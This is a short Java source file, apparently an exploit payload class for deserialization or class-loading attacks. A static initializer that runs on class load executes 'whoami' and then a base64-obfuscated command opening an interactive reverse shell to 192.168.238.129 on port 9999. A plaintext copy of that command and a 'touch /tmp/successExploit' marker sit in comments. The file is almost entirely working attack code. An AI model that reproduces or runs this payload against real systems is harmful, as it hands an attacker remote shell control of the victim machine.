import java.io.IOException;
import java.util.ArrayList;

public class Payload extends ArrayList<Integer> {
    static {
        try {
            Runtime.getRuntime().exec("whoami");
            //Runtime.getRuntime().exec("bash -c {echo,bash -c 'bash -i >& /dev/tcp/192.168.238.129/9999 0>&1'} | {base64, -d} | {bash, i}");
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzOC4xMjkvOTk5OSAwPiYxJw==}|{base64,-d}|{bash,i}");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public Payload() throws Exception {
        // Runtime.getRuntime().exec("touch /tmp/successExploit");
    }

    public static void main(String[] args) {
        try {
            Payload payload = new Payload();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
